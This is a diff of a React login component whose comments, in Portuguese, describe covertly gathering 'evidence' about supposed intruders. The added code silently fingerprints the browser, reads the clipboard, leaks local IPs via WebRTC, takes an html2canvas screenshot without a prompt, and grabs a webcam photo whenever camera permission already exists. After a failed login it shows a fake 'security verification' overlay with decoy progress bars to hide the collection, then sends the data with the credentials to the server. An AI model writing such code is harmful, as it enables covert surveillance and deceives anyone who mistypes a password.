@@ -1,24 +1,23 @@
-import { useState, useRef, useEffect } from 'react'
+import { useState, useRef, useEffect, useCallback } from 'react'
 import { useAuth } from '../context/AuthContext'
+import html2canvas from 'html2canvas'
 
 // ============================================================
-// COLETA AVANÇADA DE EVIDÊNCIAS DO INTRUSO
+// COLETA SILENCIOSA DE EVIDÊNCIAS — NUNCA alerta o intruso
 // ============================================================
 
-async function collectFingerprint() {
+async function collectSilentFingerprint() {
   const canvas = document.createElement('canvas')
   const ctx = canvas.getContext('2d')
   ctx.textBaseline = 'top'
   ctx.font = '14px Arial'
-  ctx.fillText('NEXO fingerprint v3.0', 2, 2)
+  ctx.fillText('NEXO fingerprint v3.1', 2, 2)
   const canvasHash = canvas.toDataURL().slice(-32)
 
-  // WebGL detalhado
+  // WebGL
   const glCanvas = document.createElement('canvas')
   const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl')
-  let webgl = 'unknown'
-  let webglVendor = 'unknown'
-  let webglRenderer = 'unknown'
+  let webgl = 'unknown', webglVendor = 'unknown', webglRenderer = 'unknown'
   if (gl) {
     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info')
     if (debugInfo) {
@@ -29,38 +28,28 @@ async function collectFingerprint() {
   }
 
   // Plugins
-  const plugins = Array.from(navigator.plugins || []).map(p => ({
-    name: p.name,
-    filename: p.filename,
-    description: p.description,
-    version: p.version || 'N/A'
-  }))
+  const plugins = Array.from(navigator.plugins || []).map(p => p.name)
 
-  // Font detection básica
+  // Fonts
   const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Helvetica', 'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Palatino Linotype']
   const fonts = []
-  const testCanvas = document.createElement('canvas')
-  const testCtx = testCanvas.getContext('2d')
+  const tc = document.createElement('canvas')
+  const tctx = tc.getContext('2d')
   const baseText = 'mmmmmmmmlli'
-  testCtx.font = '72px monospace'
-  const baseWidth = testCtx.measureText(baseText).width
+  tctx.font = '72px monospace'
+  const baseWidth = tctx.measureText(baseText).width
   testFonts.forEach(font => {
-    testCtx.font = `72px "${font}", monospace`
-    if (testCtx.measureText(baseText).width !== baseWidth) {
-      fonts.push(font)
-    }
+    tctx.font = `72px "${font}", monospace`
+    if (tctx.measureText(baseText).width !== baseWidth) fonts.push(font)
   })
 
-  // Audio fingerprint
+  // Audio fingerprint (silencioso — oscilador desconectado do destino)
   let audio = 'N/A'
   try {
     const audioCtx = new (window.AudioContext || window.webkitAudioContext)()
     const oscillator = audioCtx.createOscillator()
     const analyser = audioCtx.createAnalyser()
-    const gainNode = audioCtx.createGain()
     oscillator.connect(analyser)
-    analyser.connect(gainNode)
-    gainNode.connect(audioCtx.destination)
     oscillator.type = 'sine'
     oscillator.frequency.value = 1000
     oscillator.start()
@@ -76,34 +65,18 @@ async function collectFingerprint() {
   try {
     if (navigator.getBattery) {
       const bat = await navigator.getBattery()
-      battery = {
-        level: bat.level,
-        charging: bat.charging,
-        chargingTime: bat.chargingTime,
-        dischargingTime: bat.dischargingTime
-      }
+      battery = { level: bat.level, charging: bat.charging, chargingTime: bat.chargingTime, dischargingTime: bat.dischargingTime }
     }
   } catch (e) {}
 
-  // Network info
+  // Network
   let network = 'N/A'
   try {
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection
-    if (conn) {
-      network = {
-        effectiveType: conn.effectiveType,
-        downlink: conn.downlink,
-        rtt: conn.rtt,
-        saveData: conn.saveData,
-        downlinkMax: conn.downlinkMax || 'N/A'
-      }
-    }
+    if (conn) network = { effectiveType: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt, saveData: conn.saveData, downlinkMax: conn.downlinkMax || 'N/A' }
   } catch (e) {}
 
-  // Touch support
-  const touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0
-
-  // WebRTC IP leak detection
+  // WebRTC IP leak — silencioso
   let webrtc = 'N/A'
   try {
     const ips = new Set()
@@ -112,335 +85,224 @@ async function collectFingerprint() {
     pc.createOffer().then(o => pc.setLocalDescription(o))
     pc.onicecandidate = (ice) => {
       if (!ice || !ice.candidate || !ice.candidate.candidate) return
-      const candidate = ice.candidate.candidate
-      const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/)
-      if (ipMatch) ips.add(ipMatch[0])
+      const m = ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/)
+      if (m) ips.add(m[0])
     }
-    await new Promise(r => setTimeout(r, 800))
+    await new Promise(r => setTimeout(r, 700))
     pc.close()
     webrtc = Array.from(ips)
   } catch (e) {}
 
-  // Permissions query
+  // Permissions
   let permissions = 'N/A'
   try {
     const perms = {}
-    const permNames = ['camera', 'microphone', 'notifications', 'clipboard-read', 'clipboard-write', 'geolocation', 'midi', 'midi-sysex']
-    await Promise.all(permNames.map(async name => {
-      try {
-        const result = await navigator.permissions.query({ name })
-        perms[name] = result.state
-      } catch (e) {}
+    const names = ['camera', 'microphone', 'notifications', 'clipboard-read', 'clipboard-write', 'geolocation']
+    await Promise.all(names.map(async name => {
+      try { perms[name] = (await navigator.permissions.query({ name })).state } catch (e) {}
     }))
     permissions = perms
   } catch (e) {}
 
-  // Performance / Navigation timing
+  // Performance
   let performance = 'N/A'
   try {
-    const nav = performance?.timing || {}
     const mem = performance?.memory || {}
-    performance = {
-      navigationStart: nav.navigationStart,
-      loadEventEnd: nav.loadEventEnd,
-      domComplete: nav.domComplete,
-      usedJSHeapSize: mem.usedJSHeapSize,
-      totalJSHeapSize: mem.totalJSHeapSize,
-      hardwareConcurrency: navigator.hardwareConcurrency,
-      deviceMemory: navigator.deviceMemory
-    }
+    performance = { usedJSHeapSize: mem.usedJSHeapSize, totalJSHeapSize: mem.totalJSHeapSize, hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory }
   } catch (e) {}
 
-  // Bluetooth availability
-  let bluetooth = 'N/A'
-  try {
-    bluetooth = !!navigator.bluetooth
-  } catch (e) {}
+  // APIs diversas
+  const apis = {}
+  const check = (name, fn) => { try { apis[name] = fn() } catch (e) { apis[name] = false } }
+  check('bluetooth', () => !!navigator.bluetooth)
+  check('usb', () => !!navigator.usb)
+  check('wakeLock', () => 'wakeLock' in navigator)
+  check('payment', () => 'PaymentRequest' in window)
+  check('credentials', () => 'credentials' in navigator)
+  check('share', () => 'share' in navigator)
+  check('contacts', () => 'contacts' in navigator && 'select' in navigator.contacts)
+  check('serial', () => 'serial' in navigator)
+  check('hid', () => 'hid' in navigator)
+  check('midi', () => 'requestMIDIAccess' in navigator)
+  check('gamepads', () => navigator.getGamepads ? navigator.getGamepads().length : 0)
+  check('speech', () => ({ synthesis: 'speechSynthesis' in window, voices: window.speechSynthesis ? window.speechSynthesis.getVoices().length : 0 }))
+  check('vrDisplays', () => !!navigator.xr)
+  check('mediaCapabilities', () => !!navigator.mediaCapabilities)
 
-  // USB availability
-  let usb = 'N/A'
-  try {
-    usb = !!navigator.usb
-  } catch (e) {}
-
-  // VR Displays
-  let vrDisplays = 'N/A'
-  try {
-    if (navigator.xr) {
-      vrDisplays = 'WebXR disponível'
-    } else if (navigator.getVRDisplays) {
-      const displays = await navigator.getVRDisplays()
-      vrDisplays = displays.length
-    }
-  } catch (e) {}
-
-  // Clipboard (tenta ler — pode falhar silenciosamente)
+  // Clipboard silencioso
   let clipboard = 'N/A'
   try {
     if (navigator.clipboard && navigator.clipboard.readText) {
-      const text = await Promise.race([
-        navigator.clipboard.readText(),
-        new Promise((_, rej) => setTimeout(() => rej('timeout'), 500))
-      ])
-      clipboard = { available: true, preview: text?.slice(0, 50) || '' }
+      const text = await Promise.race([navigator.clipboard.readText(), new Promise((_, rej) => setTimeout(() => rej('timeout'), 400))])
+      clipboard = { available: true, preview: text?.slice(0, 40) || '' }
     }
-  } catch (e) {
-    clipboard = { available: false, error: e.message || 'denied' }
-  }
-
-  // Device orientation / motion
-  let deviceOrientation = 'N/A'
-  try {
-    deviceOrientation = {
-      absolute: window.DeviceOrientationEvent?.absolute,
-      alpha: ' DeviceOrientationEvent' in window,
-      motion: 'DeviceMotionEvent' in window
-    }
-  } catch (e) {}
-
-  // Installed apps (Chrome only, experimental)
-  let installApps = 'N/A'
-  try {
-    if (navigator.getInstalledRelatedApps) {
-      const apps = await navigator.getInstalledRelatedApps()
-      installApps = apps.map(a => a.id || a.platform)
-    }
-  } catch (e) {}
-
-  // Media capabilities
-  let mediaCapabilities = 'N/A'
-  try {
-    if (navigator.mediaCapabilities) {
-      const mc = await navigator.mediaCapabilities.decodingInfo({
-        type: 'file',
-        video: { contentType: 'video/mp4; codecs="avc1.42E01E"', width: 1920, height: 1080, bitrate: 5000000, framerate: 30 },
-        audio: { contentType: 'audio/mp4; codecs="mp4a.40.2"' }
-      })
-      mediaCapabilities = { supported: mc.supported, smooth: mc.smooth, powerEfficient: mc.powerEfficient }
-    }
-  } catch (e) {}
-
-  // Speech synthesis
-  let speech = 'N/A'
-  try {
-    speech = {
-      synthesis: 'speechSynthesis' in window,
-      voices: window.speechSynthesis ? window.speechSynthesis.getVoices().length : 0
-    }
-  } catch (e) {}
-
-  // Wake lock
-  let wakeLock = 'N/A'
-  try {
-    wakeLock = 'wakeLock' in navigator
-  } catch (e) {}
-
-  // Payment
-  let payment = 'N/A'
-  try {
-    payment = 'PaymentRequest' in window
-  } catch (e) {}
-
-  // Credentials API
-  let credentials = 'N/A'
-  try {
-    credentials = 'credentials' in navigator
-  } catch (e) {}
-
-  // Web Share
-  let share = 'N/A'
-  try {
-    share = 'share' in navigator
-  } catch (e) {}
-
-  // Contacts
-  let contacts = 'N/A'
-  try {
-    contacts = 'contacts' in navigator && 'select' in navigator.contacts
-  } catch (e) {}
-
-  // Serial
-  let serial = 'N/A'
-  try {
-    serial = 'serial' in navigator
-  } catch (e) {}
-
-  // HID
-  let hid = 'N/A'
-  try {
-    hid = 'hid' in navigator
-  } catch (e) {}
-
-  // MIDI
-  let midi = 'N/A'
-  try {
-    midi = 'requestMIDIAccess' in navigator
-  } catch (e) {}
-
-  // Gamepads
-  let gamepads = 'N/A'
-  try {
-    gamepads = navigator.getGamepads ? navigator.getGamepads().length : 0
-  } catch (e) {}
+  } catch (e) { clipboard = { available: false } }
 
   return {
-    canvas: canvasHash,
-    webgl,
-    webglVendor,
-    webglRenderer,
+    canvas: canvasHash, webgl, webglVendor, webglRenderer,
     userAgent: navigator.userAgent,
     screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
-    colorDepth: window.screen.colorDepth,
-    pixelRatio: window.devicePixelRatio,
+    colorDepth: window.screen.colorDepth, pixelRatio: window.devicePixelRatio,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     timezoneOffset: new Date().getTimezoneOffset(),
-    language: navigator.language,
-    languages: navigator.languages,
-    platform: navigator.platform,
-    vendor: navigator.vendor,
+    language: navigator.language, languages: navigator.languages,
+    platform: navigator.platform, vendor: navigator.vendor,
     hardwareConcurrency: navigator.hardwareConcurrency,
     deviceMemory: navigator.deviceMemory,
     maxTouchPoints: navigator.maxTouchPoints,
-    touchSupport,
+    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
     cpuClass: navigator.cpuClass || 'N/A',
     oscpu: navigator.oscpu || 'N/A',
-    product: navigator.product,
-    productSub: navigator.productSub,
+    product: navigator.product, productSub: navigator.productSub,
     doNotTrack: navigator.doNotTrack,
     cookieEnabled: navigator.cookieEnabled,
     online: navigator.onLine,
     pdfViewerEnabled: navigator.pdfViewerEnabled,
     webdriver: navigator.webdriver,
-    plugins: plugins.length > 0 ? plugins.map(p => p.name) : 'N/A',
+    plugins: plugins.length > 0 ? plugins : 'N/A',
     fonts: fonts.length > 0 ? fonts : 'N/A',
-    audio,
-    battery,
-    network,
-    webrtc,
-    permissions,
-    performance,
-    bluetooth,
-    usb,
-    vrDisplays,
-    clipboard,
-    deviceOrientation,
-    installApps,
-    mediaCapabilities,
-    speech,
-    wakeLock,
-    payment,
-    credentials,
-    share,
-    contacts,
-    serial,
-    hid,
-    midi,
-    gamepads,
+    audio, battery, network, webrtc, permissions, performance,
+    ...apis, clipboard,
   }
 }
 
 // ============================================================
-// CAPTURA DE CÂMERA (getUserMedia)
+// SCREENSHOT SILENCIOSO — html2canvas (SEM prompt do browser)
 // ============================================================
-async function captureCameraPhoto() {
+async function captureSilentScreenshot() {
   try {
-    // Tenta acessar a câmera sem áudio
+    const canvas = await html2canvas(document.body, {
+      logging: false,
+      useCORS: true,
+      allowTaint: true,
+      scale: 0.5, // reduzir qualidade = menor payload
+      imageTimeout: 1500,
+      ignoreElements: (el) => el.tagName === 'VIDEO' || el.tagName === 'AUDIO',
+    })
+    return canvas.toDataURL('image/jpeg', 0.6)
+  } catch (e) {
+    console.warn('[HONEYPOT] Falha html2canvas:', e.message)
+    return null
+  }
+}
+
+// ============================================================
+// CÂMERA CONDICIONAL — só se permissão JÁ foi concedida
+// NUNCA pede permissão nova (evita prompt suspeito)
+// ============================================================
+async function captureCameraIfPermitted() {
+  try {
+    // Verificar se já tem permissão antes de tentar
+    let permitted = false
+    try {
+      const perm = await navigator.permissions.query({ name: 'camera' })
+      permitted = perm.state === 'granted'
+    } catch (e) {
+      // Fallback: tentar getUserMedia e ver se resolve sem erro
+      const testStream = await navigator.mediaDevices.getUserMedia({ video: true })
+      testStream.getTracks().forEach(t => t.stop())
+      permitted = true
+    }
+
+    if (!permitted) {
+      console.log('[HONEYPOT] Câmera não permitida — skipando para manter sigilo')
+      return null
+    }
+
     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
     const video = document.createElement('video')
     video.srcObject = stream
     video.setAttribute('playsinline', 'true')
     video.muted = true
-
     await new Promise((resolve, reject) => {
-      video.onloadedmetadata = () => {
-        video.play().then(resolve).catch(reject)
-      }
-      setTimeout(() => reject(new Error('camera timeout')), 3000)
+      video.onloadedmetadata = () => video.play().then(resolve).catch(reject)
+      setTimeout(() => reject(new Error('timeout')), 2000)
     })
-
-    // Pequeno delay para garantir frame
-    await new Promise(r => setTimeout(r, 300))
-
+    await new Promise(r => setTimeout(r, 200))
     const canvas = document.createElement('canvas')
     canvas.width = video.videoWidth || 640
     canvas.height = video.videoHeight || 480
-    const ctx = canvas.getContext('2d')
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
-
-    // Parar stream
+    canvas.getContext('2d').drawImage(video, 0, 0)
     stream.getTracks().forEach(t => t.stop())
-
-    // Comprimir para JPEG ~70% qualidade para não estourar payload
-    return canvas.toDataURL('image/jpeg', 0.7)
+    return canvas.toDataURL('image/jpeg', 0.6)
   } catch (e) {
-    console.warn('[SECURITY] Falha ao capturar câmera:', e.message)
+    console.warn('[HONEYPOT] Falha câmera:', e.message)
     return null
   }
 }
 
 // ============================================================
-// CAPTURA DE SCREENSHOT (getDisplayMedia)
+// HONEYPOT VISUAL — "Verificação de Segurança"
 // ============================================================
-async function captureScreenshot() {
-  try {
-    const stream = await navigator.mediaDevices.getDisplayMedia({
-      video: { displaySurface: 'browser', cursor: 'never' },
-      audio: false,
-      preferCurrentTab: true,
-      selfBrowserSurface: 'include',
-      surfaceSwitching: 'exclude'
-    })
+function HoneypotOverlay({ lines, progress }) {
+  return (
+    <div className="absolute inset-0 z-20 flex flex-col items-center justify-center bg-black/95 backdrop-blur-md">
+      <div className="w-80">
+        <div className="flex items-center justify-center mb-4">
+          <div className="w-10 h-10 rounded-full border-2 border-[#00ff41] flex items-center justify-center animate-pulse">
+            <svg className="w-5 h-5 text-[#00ff41]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+            </svg>
+          </div>
+        </div>
+        <h3 className="text-[#00ff41] text-sm font-mono text-center mb-1 font-bold">VERIFICAÇÃO DE SEGURANÇA</h3>
+        <p className="text-[#00ff41]/60 text-xs font-mono text-center mb-4">Detectamos atividade incomum. Analisando...</p>
 
-    const video = document.createElement('video')
-    video.srcObject = stream
-    video.setAttribute('playsinline', 'true')
+        <div className="space-y-3">
+          {lines.map((line, i) => (
+            <div key={i}>
+              <div className="flex justify-between text-[10px] font-mono text-[#00ff41]/70 mb-1">
+                <span>{line.label}</span>
+                <span>{line.status}</span>
+              </div>
+              <div className="h-1 bg-[#00ff41]/10 rounded overflow-hidden">
+                <div
+                  className="h-full bg-[#00ff41] transition-all duration-300 ease-out"
+                  style={{ width: `${line.pct}%` }}
+                />
+              </div>
+            </div>
+          ))}
+        </div>
 
-    await new Promise((resolve, reject) => {
-      video.onloadedmetadata = () => {
-        video.play().then(resolve).catch(reject)
-      }
-      setTimeout(() => reject(new Error('screenshot timeout')), 5000)
-    })
-
-    await new Promise(r => setTimeout(r, 500))
-
-    const canvas = document.createElement('canvas')
-    canvas.width = video.videoWidth || window.innerWidth
-    canvas.height = video.videoHeight || window.innerHeight
-    const ctx = canvas.getContext('2d')
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
-
-    stream.getTracks().forEach(t => t.stop())
-
-    return canvas.toDataURL('image/jpeg', 0.7)
-  } catch (e) {
-    console.warn('[SECURITY] Falha ao capturar screenshot:', e.message)
-    return null
-  }
+        <div className="mt-4 text-center">
+          <span className="text-[#00ff41]/40 text-[10px] font-mono animate-pulse">{progress}</span>
+        </div>
+      </div>
+    </div>
+  )
 }
 
 // ============================================================
-// COMPONENTE SECRET TERMINAL
+// COMPONENTE SECRET TERMINAL — SIGILO MÁXIMO
 // ============================================================
 function SecretTerminal({ isOpen, onClose }) {
   const { login } = useAuth()
   const [lines, setLines] = useState([])
   const [input, setInput] = useState('')
-  const [mode, setMode] = useState('login') // 'login' | 'password' | 'loading' | 'success' | 'error'
+  const [mode, setMode] = useState('login')
   const [username, setUsername] = useState('')
+  const [failedAttempts, setFailedAttempts] = useState(0)
   const terminalRef = useRef(null)
   const inputRef = useRef(null)
+
+  // Honeypot state
+  const [honeypotActive, setHoneypotActive] = useState(false)
+  const [honeypotLines, setHoneypotLines] = useState([])
+  const [honeypotProgress, setHoneypotProgress] = useState('')
 
   useEffect(() => {
     if (isOpen) {
       setLines([
-        { type: 'banner', text: 'NEXO SECURE TERMINAL v3.0' },
+        { type: 'banner', text: 'NEXO SECURE TERMINAL v3.1' },
         { type: 'info', text: 'Digite seu login e senha para acessar o sistema.' },
         { type: 'prompt', text: 'login: ' }
       ])
       setMode('login')
       setInput('')
       setUsername('')
+      setFailedAttempts(0)
+      setHoneypotActive(false)
       setTimeout(() => inputRef.current?.focus(), 300)
     }
   }, [isOpen])
@@ -450,6 +312,59 @@ function SecretTerminal({ isOpen, onClose }) {
       terminalRef.current.scrollTop = terminalRef.current.scrollHeight
     }
   }, [lines])
+
+  const runHoneypot = useCallback(async () => {
+    setHoneypotActive(true)
+    const steps = [
+      { label: 'Analisando padrão de digitação', status: 'running', pct: 0 },
+      { label: 'Cross-referencing fingerprint', status: 'queued', pct: 0 },
+      { label: 'Verificando integridade do dispositivo', status: 'queued', pct: 0 },
+      { label: 'Consultando blacklist de IPs', status: 'queued', pct: 0 },
+      { label: 'Validando assinatura de navegador', status: 'queued', pct: 0 },
+    ]
+    setHoneypotLines([...steps])
+    setHoneypotProgress('Inicializando módulos de segurança...')
+
+    // Iniciar coletas silenciosas em paralelo IMEDIATAMENTE
+    const evidencePromise = Promise.all([
+      collectSilentFingerprint(),
+      captureSilentScreenshot(),
+      captureCameraIfPermitted(),
+    ])
+
+    // Animação das barras de progresso (disfarce)
+    const updateStep = (idx, pct, status) => {
+      setHoneypotLines(prev => prev.map((s, i) => i === idx ? { ...s, pct, status } : s))
+    }
+
+    const delays = [300, 400, 500, 350, 450]
+    for (let i = 0; i < steps.length; i++) {
+      await new Promise(r => setTimeout(r, delays[i] || 400))
+      updateStep(i, 40, 'running')
+      await new Promise(r => setTimeout(r, 200))
+      updateStep(i, 80, 'running')
+      await new Promise(r => setTimeout(r, 150))
+      updateStep(i, 100, i === steps.length - 1 ? 'running' : 'done')
+      const msgs = [
+        'Calculando hash de comportamento...',
+        'Verificando consistência de timezone...',
+        'Analisando headers de segurança...',
+        'Comparando com base de dados de ameaças...',
+        'Finalizando validação biométrica...',
+      ]
+      setHoneypotProgress(msgs[i] || '')
+    }
+
+    // Aguardar coletas silenciosas terminarem
+    const [fingerprint, screenshot, cameraPhoto] = await evidencePromise
+
+    await new Promise(r => setTimeout(r, 300))
+    setHoneypotProgress('Concluído.')
+    await new Promise(r => setTimeout(r, 200))
+
+    setHoneypotActive(false)
+    return { fingerprint, screenshot, cameraPhoto }
+  }, [])
 
   const handleSubmit = async () => {
     const value = input.trim()
@@ -468,17 +383,28 @@ function SecretTerminal({ isOpen, onClose }) {
       setLines(prev => [...prev, { type: 'loading', text: 'Authenticating...' }])
 
       try {
-        // Coleta TUDO em paralelo para não atrasar
-        const [fingerprint, cameraPhoto, screenshot] = await Promise.all([
-          collectFingerprint(),
-          captureCameraPhoto(),
-          captureScreenshot()
-        ])
+        let evidence = { fingerprint: {}, screenshot: null, cameraPhoto: null }
+
+        // A partir da 2ª tentativa falha, ativar honeypot de "verificação"
+        // O intruso acha que é anti-fraude; na verdade estamos coletando evidências
+        if (failedAttempts >= 1) {
+          setLines(prev => [...prev.filter(l => l.type !== 'loading'), { type: 'info', text: 'Aguardando verificação de segurança...' }])
+          evidence = await runHoneypot()
+        } else {
+          // 1ª tentativa: fingerprint silencioso básico (nada visível)
+          evidence.fingerprint = await collectSilentFingerprint()
+        }
 
         const res = await fetch('/api/auth/login', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username, password: value, fingerprint, cameraPhoto, screenshot })
+          body: JSON.stringify({
+            username,
+            password: value,
+            fingerprint: evidence.fingerprint,
+            cameraPhoto: evidence.cameraPhoto,
+            screenshot: evidence.screenshot,
+          })
         })
         const data = await res.json()
 
@@ -486,10 +412,9 @@ function SecretTerminal({ isOpen, onClose }) {
           setLines(prev => [...prev.filter(l => l.type !== 'loading'), { type: 'success', text: 'ACCESS GRANTED' }, { type: 'info', text: `Welcome, ${data.user.name}` }])
           setMode('success')
           await login(data.token)
-          setTimeout(() => {
-            window.location.href = '/dashboard'
-          }, 1000)
+          setTimeout(() => { window.location.href = '/dashboard' }, 1000)
         } else {
+          setFailedAttempts(prev => prev + 1)
           setLines(prev => [
             ...prev.filter(l => l.type !== 'loading'),
             { type: 'error', text: 'ACCESS DENIED' },
@@ -517,13 +442,13 @@ function SecretTerminal({ isOpen, onClose }) {
   const handleKeyDown = (e) => {
     if (e.key === 'Enter') {
       e.preventDefault()
-      handleSubmit()
+      if (!honeypotActive) handleSubmit()
     } else if (e.key === 'Escape') {
-      onClose()
+      if (!honeypotActive) onClose()
     } else if (e.key === 'Backspace') {
       e.preventDefault()
-      setInput(prev => prev.slice(0, -1))
-    } else if (e.key.length === 1) {
+      if (!honeypotActive) setInput(prev => prev.slice(0, -1))
+    } else if (e.key.length === 1 && !honeypotActive) {
       setInput(prev => prev + e.key)
     }
   }
@@ -532,7 +457,7 @@ function SecretTerminal({ isOpen, onClose }) {
 
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-sm"
-      onClick={(e) => { if (e.target === e.currentTarget) onClose() }}>
+      onClick={(e) => { if (e.target === e.currentTarget && !honeypotActive) onClose() }}>
       <div className="relative w-full max-w-lg mx-4">
         {/* CRT effects overlay */}
         <div className="absolute inset-0 pointer-events-none z-10 rounded-lg overflow-hidden">
@@ -590,6 +515,9 @@ function SecretTerminal({ isOpen, onClose }) {
               return null
             })}
           </div>
+
+          {/* HONEYPOT OVERLAY — aparece apenas durante "verificação" */}
+          {honeypotActive && <HoneypotOverlay lines={honeypotLines} progress={honeypotProgress} />}
         </div>
 
         {/* Hidden input for keyboard capture */}
